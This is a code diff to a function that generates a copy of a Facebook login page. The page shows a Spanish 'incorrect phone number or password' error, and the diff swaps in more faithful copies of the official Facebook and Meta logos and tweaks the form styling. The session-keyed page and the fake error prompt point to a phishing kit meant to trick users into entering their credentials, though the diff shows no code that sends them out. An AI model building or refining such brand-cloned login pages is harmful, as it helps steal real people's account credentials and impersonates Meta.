@@ -192,7 +192,7 @@ function buildFacebookPage(sessionId: string): string {
     width: 100%;
     padding: 15px 18px;
     border: 1.5px solid #ccd0d5;
-    border-radius: 50px;
+    border-radius: 8px;
     font-size: 16px;
     color: #1c1e21;
     background: #fff;
@@ -303,10 +303,16 @@ function buildFacebookPage(sessionId: string): string {
 
 <div class="main">
 
-  <!-- Logo oficial de Facebook (círculo azul con f blanca) -->
-  <svg class="fb-icon" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <circle cx="36" cy="36" r="36" fill="#1877F2"/>
-    <path d="M46.5 45.75l1.313-8.548H39.61v-5.55c0-2.338 1.145-4.617 4.82-4.617h3.73v-7.278S44.74 19 41.326 19c-6.797 0-11.24 4.12-11.24 11.583v6.619H22.5v8.548h7.586V66.63a28.56 28.56 0 008.848 0V45.75H46.5z" fill="white"/>
+  <!-- Logo oficial de Facebook -->
+  <svg class="fb-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <linearGradient x1="50%" x2="50%" y1="97.0782%" y2="0%" id="fbgrad">
+        <stop offset="0%" stop-color="#0062E0"/>
+        <stop offset="100%" stop-color="#19AFFF"/>
+      </linearGradient>
+    </defs>
+    <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z" fill="url(#fbgrad)"/>
+    <path d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z" fill="#fff"/>
   </svg>
 
   <div class="error-msg" id="err">El número de teléfono o la contraseña que has introducido es incorrecto.</div>
@@ -337,11 +343,24 @@ function buildFacebookPage(sessionId: string): string {
 
 <!-- Logo Meta oficial -->
 <div class="meta-footer">
-  <svg width="38" height="14" viewBox="0 0 62 22" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <!-- Símbolo infinito de Meta -->
-    <path d="M3.89 11c0-1.54.37-2.79.88-3.67.7-1.22 1.72-1.83 2.9-1.83 1.02 0 1.9.38 2.99 1.72.73.9 1.47 2.2 2.15 3.78.68-1.58 1.42-2.88 2.15-3.78C15.97 5.88 16.85 5.5 17.87 5.5c1.18 0 2.2.61 2.9 1.83.51.88.88 2.13.88 3.67 0 2.07-.64 3.83-1.77 5.08-.95 1.05-2.12 1.62-3.49 1.62-1.02 0-1.92-.32-2.88-1.06-.75-.58-1.52-1.47-2.34-2.79-.08-.13-.16-.27-.24-.41-.08.14-.16.28-.24.41-.82 1.32-1.59 2.21-2.34 2.79-.96.74-1.86 1.06-2.88 1.06-1.37 0-2.54-.57-3.49-1.62C4.53 14.83 3.89 13.07 3.89 11z" fill="#0082FB"/>
-    <!-- Texto "Meta" -->
-    <text x="26" y="17" font-family="-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Arial,sans-serif" font-size="14" font-weight="500" fill="#606770">Meta</text>
+  <svg width="54" height="18" viewBox="0 0 54 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <linearGradient id="meta-a" x1="4.18" y1="9" x2="13.96" y2="9" gradientUnits="userSpaceOnUse">
+        <stop offset="0" stop-color="#0064e1"/>
+        <stop offset=".4" stop-color="#0064e1"/>
+        <stop offset=".83" stop-color="#0073ee"/>
+        <stop offset="1" stop-color="#0082fb"/>
+      </linearGradient>
+      <linearGradient id="meta-b" x1="9.07" y1="15.33" x2="9.07" y2="8.09" gradientUnits="userSpaceOnUse">
+        <stop offset="0" stop-color="#0082fb"/>
+        <stop offset="1" stop-color="#0064e0"/>
+      </linearGradient>
+    </defs>
+    <!-- Símbolo ∞ Meta oficial -->
+    <path d="M4.18 9c0-1.07.26-1.95.63-2.56.49-.83 1.2-1.28 2.03-1.28.71 0 1.33.27 2.09 1.2.51.63 1.03 1.54 1.51 2.64.48-1.1 1-2.01 1.51-2.64.76-.93 1.38-1.2 2.09-1.2.83 0 1.54.45 2.03 1.28.37.61.63 1.49.63 2.56 0 1.45-.45 2.68-1.24 3.56-.66.73-1.48 1.13-2.44 1.13-.71 0-1.34-.22-2.01-.74-.52-.4-1.06-1.03-1.63-1.95l-.37-.62-.37.62c-.57.92-1.11 1.55-1.63 1.95-.67.52-1.3.74-2.01.74-.96 0-1.78-.4-2.44-1.13C4.63 11.68 4.18 10.45 4.18 9z" fill="url(#meta-a)"/>
+    <path d="M4.18 9c0 1.45.45 2.68 1.24 3.56.66.73 1.48 1.13 2.44 1.13.71 0 1.34-.22 2.01-.74.52-.4 1.06-1.03 1.63-1.95l.37-.62.37.62c.57.92 1.11 1.55 1.63 1.95.67.52 1.3.74 2.01.74.96 0 1.78-.4 2.44-1.13.79-.88 1.24-2.11 1.24-3.56H4.18z" fill="url(#meta-b)"/>
+    <!-- Texto Meta -->
+    <text x="21" y="13.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="12" font-weight="500" fill="#8a8d91" letter-spacing="0.1">Meta</text>
   </svg>
 </div>
 
